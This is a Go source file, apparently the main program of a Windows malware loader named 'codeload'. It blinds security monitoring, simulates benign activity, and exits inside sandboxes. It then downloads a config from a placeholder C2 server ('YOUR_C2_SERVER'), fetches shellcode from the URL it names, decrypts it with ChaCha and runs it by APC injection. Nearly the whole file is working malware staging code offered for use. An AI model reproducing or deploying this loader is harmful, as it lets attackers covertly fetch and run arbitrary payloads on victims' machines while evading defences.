//go:build windows

package main

import (
	"codeload/internal/check"
	"codeload/internal/evasion"
	"codeload/internal/log"
	"codeload/nopoe"
	"math/rand"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/gonutz/ide/w32"
)

var (
	// This URL should point to a file containing the URL of the actual shellcode payload.
	// In a real-world scenario, this should be encrypted.
	configURL = "http://YOUR_C2_SERVER/config.txt"
)

func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// simpleWait performs a delay using a waitable timer.
func simpleWait(duration time.Duration) {
	// We get procCreateWaitableTimer from injector.go's kernel32 var
	timerHandle, _, _ := procCreateWaitableTimer.Call(0, 0, 0)
	if timerHandle == 0 {
		// Fallback to standard sleep if timer creation fails
		time.Sleep(duration)
		return
	}
	defer syscall.CloseHandle(syscall.Handle(timerHandle))
	dueTime := -(duration.Nanoseconds() / 100)
	procSetWaitableTimer.Call(timerHandle, uintptr(unsafe.Pointer(&dueTime)), 0, 0, 0, 0)
	procWaitForSingleObject.Call(timerHandle, INFINITE)
}

func main() {
	// closeWindows(w32.SW_HIDE) // Temporarily disabled for debugging
	runtime.LockOSThread()

	// Stage 1: Initial Delay & Benign Behavior Simulation
	evasion.Blind()
	check.RunSystemAudit()
	rand.Seed(time.Now().UnixNano())
	initialSleep := time.Duration(rand.Intn(5)+3) * time.Second
	simpleWait(initialSleep)

	// Stage 2: Anti-Sandbox Environment Checks
	if !check.EnvironmentChecksPass() {
		os.Exit(0)
	}

	// Stage 3: Fetch Remote Configuration and Payload
	log.Info("Fetching config from %s", configURL)
	configData, err := nopoe.DownloadShellcode(configURL)
	if err != nil {
		log.Error("Config download failed: %v", err)
		os.Exit(1)
	}

	shellcodeURL := strings.TrimSpace(string(configData))
	log.Debugf("Shellcode URL: %s", shellcodeURL)

	sc, err := nopoe.DownloadShellcode(shellcodeURL)
	if err != nil || len(sc) == 0 {
		log.Error("Payload download failed")
		os.Exit(1)
	}
	log.Success("Payload downloaded (%d bytes)", len(sc))

	// Stage 4: Initialize Syscall Resolver, Decrypt, and Execute
	if err := initResolver(); err != nil {
		log.Error("Resolver init failed")
		os.Exit(1)
	}

	log.Info("Decrypting payload...")
	decoded, err := decryptChaCha(sc)
	if err != nil {
		log.Error("Decryption failed, using raw")
		decoded = sc
	} else {
		log.Success("Decrypted (%d bytes)", len(decoded))
	}

	// The executePayload function now handles the entire advanced injection and execution process.
	log.Info("Executing payload...")
	executePayload(decoded)

	// The program will now be kept alive by the infinite loop inside executePayload,
	// waiting for the APC to be processed.
}
